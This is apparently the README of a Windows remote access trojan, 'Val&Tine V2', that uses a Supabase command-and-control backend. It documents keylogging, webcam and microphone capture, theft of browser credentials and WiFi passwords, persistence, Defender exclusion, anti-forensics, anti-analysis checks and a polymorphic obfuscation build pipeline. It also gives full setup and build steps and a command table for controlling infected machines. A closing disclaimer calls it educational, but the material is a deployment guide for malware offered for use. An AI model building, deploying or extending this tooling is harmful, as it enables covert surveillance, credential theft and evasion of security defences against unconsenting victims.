# Val&Tine V2 - Machine Management System

A sophisticated, cross-platform remote machine management framework utilizing a custom Supabase backend for command and control (C2). Val&Tine V2 provides a modern web-based dashboard for fleet management, real-time surveillance, and rapid data exfiltration.

![Version](https://img.shields.io/badge/version-2.0.0-red)
![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go)
![Supabase](https://img.shields.io/badge/Supabase-Backend-3ECF8E?logo=supabase)

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Prerequisites](#prerequisites)
- [Quick Start](#quick-start)
- [Manual Setup](#manual-setup-without-setuppy)
- [Usage Guide](#usage-guide)
- [Command Reference](#command-reference)
- [Project Structure](#project-structure)
- [Credits](#credits)
- [Disclaimer](#disclaimer)

---

## Features

### Core Capabilities
- **Custom C2 Infrastructure**: Migrated from Discord API to a dedicated Supabase backend for total control, reliability, and data privacy.
- **Real-Time Dashboard**: Modern React-based UI built with Lovable.dev, featuring live updates via Supabase Realtime subscriptions.
- **Multi-Client Management**: Monitor and control hundreds of machines simultaneously with batch command execution.
- **Encrypted Communications**: AES-256 encrypted command streams (optional implementation in payload).

### Surveillance Suite
- **Remote Shell**: Execute commands via native Windows API `CreateProcess` with Anonymous Pipes for I/O redirection (stealthier than `exec.Command`).
- **Screen Capture**: Native GDI `BitBlt` implementation compiled directly into the binary — no external FFmpeg dependency required for screenshots.
- **Webcam & Microphone**: Optional FFmpeg integration for media capture.
- **Keylogger**: Low-level `GetAsyncKeyState` hooking with active window context tracking.
- **Clipboard Monitoring**: Periodic clipboard content extraction.

### Exfiltration Tools
- **File Manager**: Browse, upload, and download files with chunked transfer support (bypasses file size limits).
- **Browser Data**: Extract history, cookies, and saved credentials (Chrome, Edge, Firefox).
- **Credential Harvesting**: WiFi passwords, system info, and user data.

### System Control
- **Persistence**: Startup folder VBS stager — no registry keys, no file copies.
- **UAC Elevation**: `ShellExecuteW` "runas" elevation — current session exits so the elevated process acquires the mutex and connects as admin.
- **Defender Exclusion**: `MpCmdRun.exe` direct exclusion — avoids PowerShell/AMSI entirely.
- **Anti-Forensics**: Clear temp files, PowerShell history, RunMRU, and Recycle Bin.
- **Anti-Analysis**: VM detection (MAC address, registry, BIOS), debugger checks, and analysis tool detection (Process Hacker, Wireshark, etc.).

### Build Pipeline (obfus.py)
- **Custom Bytecode VM**: Stager logic encoded as bytecode interpreted by a randomized VM — static analysis sees a generic interpreter loop, not the actual operations.
- **Polymorphic Opcodes**: Each build assigns random byte values to all 12 VM opcodes. No two builds share the same instruction set.
- **Multi-Layer Encryption**: Payload encrypted with XOR + RC4 (two keys). Bytecode blob XOR'd with a runtime key. Inline data obfuscated with a per-build key.
- **All Identifiers Randomized**: Every function name, variable name, and parameter name is unique per build.
- **No Plaintext Strings**: All string literals stored as XOR-encoded byte arrays decoded at runtime.
- **Dead Code Injection**: 5-8 junk functions + 4-6 fake VM opcodes to confuse analysis.
- **Indirect Execution**: Uses `ShellExecuteW` via syscall — no `os/exec` import, avoids dropper heuristics.

---

## Architecture

```
+-------------------+         +------------------+         +---------------------+
|   Target Machine  | <-----> |   Supabase DB    | <-----> |  Operator Dashboard |
|   (Go Payload)    |   HTTPS |   (PostgreSQL)   |   HTTPS |   (React/Vite)      |
+-------------------+         +------------------+         +---------------------+
        |                            |                            |
        | 1. Beacon / Register       |                            |
        | 2. Fetch Commands          |                            |
        | 3. Execute & Upload Result |                            |
        | 4. Upload Files/Screens    |                            |
        +----------------------------+                            |
                                     <----------------------------+
                                              1. View Fleet Status
                                              2. Issue Commands
                                              3. View Screenshots/Logs
```

---

## Prerequisites

- **Go** 1.21+ — [go.dev/dl](https://go.dev/dl/)
- **Node.js & npm** 18+ — for the web dashboard
- **Python 3.10+** — for the build/setup tool
- **Supabase account** — [supabase.com](https://supabase.com) (free tier works)
- **Python `requests`** — `pip install requests`

Optional:
- **Supabase CLI** — for automated migrations/deploys ([install guide](https://supabase.com/docs/guides/cli))

---

## Quick Start

```bash
# 1. Clone
git clone https://github.com/listentosmoke/val-tine-v2.git
cd Val-Tine-V2

# 2. Install web dashboard deps
npm install

# 3. Run setup (configures everything + builds payload)
python3 setup.py
```

The setup tool will:
1. Ask for your Supabase project URL and anon key
2. Optionally configure a secondary Supabase project for redundancy
3. Configure webhook URL for anti-analysis reporting
4. Update all config files (`main.go`, `.env`, `obfus.py`)
5. Run SQL migrations via Supabase CLI (if installed)
6. Deploy the `file-upload` edge function
7. Build the payload EXE using the obfuscation pipeline

To rebuild later without re-running setup:
```bash
python3 setup.py build
```

---

## Manual Setup (without setup.py)

### 1. Create Supabase Project

1. Log in to [Supabase](https://supabase.com/).
2. Click **"New Project"**.
3. Name it (e.g., `val-tine-c2`). Set a strong database password. Remember this password — the CLI will ask for it.
4. Select a region close to you and wait for it to provision.

### 2. Run SQL Migrations

**Option A — CLI setup** (recommended):
```bash
npx supabase login
npx supabase link --project-ref <your-project-ref>
npx supabase db push
npx supabase functions deploy file-upload --no-verify-jwt
```

**Option B — Manual paste**:
- Go to **SQL Editor** in your Supabase dashboard.
- Paste and run `supabase/migrations/01_schema.sql` — creates tables, RLS policies, indexes, and realtime subscriptions.
- Paste and run `supabase/migrations/02_storage.sql` — creates storage buckets and access policies.
- Deploy the edge function via CLI or paste `supabase/functions/file-upload/index.ts` into **Edge Functions > New Function** in the dashboard.

> **Important**: The `file-upload` edge function is required. Without it, screenshots, screen recordings, and file uploads will silently fail.

### 3. Get Your Credentials

In the Supabase dashboard, go to **Project Overview (scroll down) > Project API**:
- Copy the **Project URL** — this is your Supabase URL.
- Copy the **anon public key / Publishable API Key** — this is your anon key.

### 4. Configure Files

Edit `main.go` — replace the placeholder C2 domain config (in the `main()` function, search for `Build config`):
```go
Domains: []C2Domain{
    {
        URL:      "https://your-project-ref.supabase.co", // PASTE HERE
        APIKey:   "your-anon-key-here",                   // PASTE HERE
        Priority: 10,
    },
},
```

Edit `.env` — for the web dashboard:
```env
VITE_SUPABASE_URL="https://your-project-ref.supabase.co"
VITE_SUPABASE_PUBLISHABLE_KEY="your-anon-key-here"
```

### 5. Create a Dashboard User

In the Supabase dashboard, go to **Authentication > Users**:
- Click **"Add User"** and select **"Create New User"**.
- Enter an email and password — these will be your login credentials for the dashboard.

### 6. Frontend Dashboard

```bash
npm install
npm run dev
```

Open `http://localhost:5173` in your browser.

**Deploy (Optional)**: Push to GitHub and connect to Vercel/Netlify. Set `VITE_SUPABASE_URL` and `VITE_SUPABASE_PUBLISHABLE_KEY` in your hosting provider's environment variables.

### 7. Build Payload

```bash
python3 obfus.py
```

The final `.exe` is placed in your current directory.

---

## Usage Guide

### Operating the Dashboard

1. **Dashboard View**:
   - When you open the site, you see the **Fleet Overview**.
   - Machines running the payload will appear here automatically within 30 seconds.
   - Status Indicators: Online, Idle, Offline.

2. **Control Panel**:
   - Click a machine row to open the **Control Panel**.
   - **System Info**: View hardware, network, and OS details.
   - **Remote Shell**: Type commands and see output in real-time.
   - **Surveillance**: View screenshots, webcam feeds, and keylogs.
   - **File Manager**: Browse the file system and exfiltrate data.

3. **Batch Commands**:
   - Use the checkboxes on the left of the table to select multiple machines.
   - Use the **Batch Action Bar** to send commands to all selected machines at once.

---

## Command Reference

| Command | Description |
| :--- | :--- |
| `sysinfo` | Gather and upload full system specifications |
| `isadmin` | Check if running with admin privileges |
| `screenshot` | Capture a single screenshot of the desktop |
| `screenshots` | Start continuous screenshot capture (every 30s) |
| `keycapture` / `keylog_start` | Start the background keylogger |
| `keylog_stop` | Stop the keylogger |
| `persist` | Add persistence (Startup folder VBS stager) |
| `unpersist` | Remove persistence |
| `elevate` | Attempt UAC elevation to gain admin privileges |
| `excludec` | Exclude C:\\ from Defender scans (via MpCmdRun.exe) |
| `excludeall` | Exclude C:\\ through G:\\ from Defender |
| `cleanup` | Clear temp files, history, and recycle bin |
| `browserdb` | Exfiltrate browser databases (Chrome, Edge, Firefox) |
| `parsebrowser` | Parse browser data locally |
| `exfiltrate` | Exfil files (args: path, extensions, max_size) |
| `download` | Download file from client (args: path) |
| `upload` | Upload file to client (args: path, data) |
| `foldertree` | Show folder trees for Desktop/Docs/Downloads |
| `webcam` | Start webcam capture job |
| `microphone` | Start microphone recording job |
| `recordscreen` | Record screen video (args: seconds) |
| `wifi` | Show saved WiFi networks + passwords |
| `nearbywifi` | Show nearby WiFi networks |
| `enumeratelan` | Scan LAN for devices |
| `shell` | Execute raw shell command |
| `processes` | List running processes |
| `jobs` | List running background jobs |
| `pausejobs` | Stop all background jobs |
| `resumejobs` | Resume default jobs |
| `kill` | Kill a process (args: pid) or stop a job (args: job) |
| `enableio` | Enable keyboard/mouse (admin) |
| `disableio` | Disable keyboard/mouse (admin) |
| `message` | Show message box on target |
| `wallpaper` | Set wallpaper from URL |
| `minimizeall` | Minimize all windows |
| `darkmode` / `lightmode` | Toggle dark/light mode |
| `shortcutbomb` | Create 50 fake USB shortcuts on Desktop |
| `fakeupdate` | Show fake Windows update screen |
| `soundspam` | Play all Windows system sounds |
| `antianalysis` | VM/debugger/tools detection report |
| `ping` | Connection test |
| `sleep` | Sleep N seconds |
| `exit` | Terminate the payload |

---

## Project Structure

```
main.go              - Go payload (RAT agent)
obfus.py             - Polymorphic VM-based build pipeline
setup.py             - Interactive setup & build CLI
.env                 - Web dashboard Supabase config
src/                 - React/TypeScript web dashboard
supabase/
  migrations/        - SQL schema + storage setup
  functions/         - Edge functions (file-upload)
```

---

## Credits

- **[Beigeworm](https://github.com/beigeworm)** — Original PowerShell payload and C2 framework that inspired this project.

---

## Disclaimer

**This tool is intended for EDUCATIONAL and RESEARCH purposes only.**

The use of this software to target systems that you do not own or have explicit permission to test is illegal. The developers and contributors assume no liability and are not responsible for any misuse or damage caused by this program. By using this software, you agree to comply with all applicable local, state, and federal laws.

**Unauthorized access to computer systems is a crime.**
